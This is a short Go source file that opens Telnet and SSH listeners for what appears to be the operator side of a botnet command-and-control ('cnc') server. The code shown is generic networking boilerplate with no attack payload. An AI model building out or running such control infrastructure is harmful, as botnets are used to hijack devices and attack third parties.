package masters

import (
	"cnc/core/config"
	"cnc/core/utils"
	"fmt"
	"net"
)

var GlobalSlots int

func Listen() {
	tel, err := net.Listen("tcp", fmt.Sprintf("%s:%d", config.Config.Server.Host, config.Config.Server.Port)) 
	if err != nil {
		utils.Errorf("Telnet Listener Error: %v", err)
	}

	utils.Infof("Listening for Telnet connections port=%d", config.Config.Server.Port)

	go StartSSH()

	for {
		conn, err := tel.Accept()
		if err != nil {
			break
		}
		go initialHandler(conn)
	}
}
